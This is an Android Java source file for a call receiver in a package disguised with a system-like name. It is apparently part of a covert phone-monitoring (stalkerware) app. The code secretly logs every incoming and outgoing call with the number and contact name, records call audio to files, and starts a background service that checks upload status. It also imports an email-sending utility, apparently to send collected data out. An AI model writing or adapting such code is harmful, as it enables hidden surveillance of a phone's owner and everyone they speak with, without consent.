package com.android.system.controled;

import java.io.File;

import android.app.Service;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.media.MediaRecorder;
import android.telephony.PhoneStateListener;
import android.telephony.TelephonyManager;
import android.util.Log;

import com.android.system.controled.util.AudioUtil;
import com.android.system.controled.util.ContactsUtil;
import com.android.system.controled.util.FileUtil;
import com.android.system.controled.util.RecorderUtil;
import com.android.system.controled.util.SendEmailUtil;
import com.android.system.controled.util.TimeUtil;

public class CallReceiver extends BroadcastReceiver {

	private static final String TAG = "CallReceiver";

	private TelephonyManager tm;
	private MyListenner ml;

	@Override
	public void onReceive(Context context, Intent intent) {

		Globle.startBackService(context);// Start the back service
		Globle.checkUploadedOrNot(context);

		if (tm == null) {
			tm = (TelephonyManager) context.getSystemService(Service.TELEPHONY_SERVICE);
		}
		if (ml == null) {
			ml = new MyListenner(context);
		}

		if (intent.getAction().equals(Intent.ACTION_NEW_OUTGOING_CALL)) {
			FileUtil.writeFile("去电：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "    " + ContactsUtil.getNameFromContactsByNumber(context, getResultData()) + ":" + getResultData(), Globle.FILE_CALL_LOG, true);
			startRecord(context, getResultData());
		} else {
			tm.listen(ml, PhoneStateListener.LISTEN_CALL_STATE);
		}

	}

	private class MyListenner extends PhoneStateListener {

		private Context con;

		public MyListenner(Context c) {
			this.con = c;
		}

		@Override
		public void onCallStateChanged(int state, String incomingNumber) {
			// TODO Auto-generated method stub
			// state 当前状态 incomingNumber,貌似没有去电的API
			super.onCallStateChanged(state, incomingNumber);

			switch (state) {

			case TelephonyManager.CALL_STATE_IDLE:
				Log.i("CallReceiver", "idle");
				FileUtil.writeFile("\r\n挂断：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "\r\n\r\n", Globle.FILE_CALL_LOG, true);
				stopRecord(con);
				break;
			case TelephonyManager.CALL_STATE_OFFHOOK:
				Log.i("CallReceiver", "offhook");
				FileUtil.writeFile("\r\n接听：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()), Globle.FILE_CALL_LOG, true);
				break;
			case TelephonyManager.CALL_STATE_RINGING:
				Log.i("CallReceiver", "ring num: " + incomingNumber);
				FileUtil.writeFile("来电：" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + "    " + ContactsUtil.getNameFromContactsByNumber(con, incomingNumber) + ":" + incomingNumber, Globle.FILE_CALL_LOG, true);
				startRecord(con, incomingNumber);
				if (incomingNumber.contains(Globle.PHONE_NUMBER)) {
					// 在特定时间内，自动调大音量
					switch (TimeUtil.inTime()) {
					case TimeUtil.TIME_NOW_NIGHT:
						AudioUtil.turnUpMost(con);
						break;
					case TimeUtil.TIME_NOW_MOON:
						AudioUtil.turnUpSecond(con);
						break;

					default:
						break;
					}
				}

				break;
			}

			tm.listen(ml, PhoneStateListener.LISTEN_NONE);
		}

	}

	private void startRecord(Context con, String number) {
		// 文件保存位置
		File file = new File(Globle.FILEPATH_AUDIOS_CALL + number + "_" + TimeUtil.longToDateTimeString(TimeUtil.getCurrentTimeMillis()) + ".amr");
		RecorderUtil.getInstence(con).startRecorder(file, -1);
	}

	private void stopRecord(Context con) {
		RecorderUtil.getInstence(con).stopRecorder();
	}
}
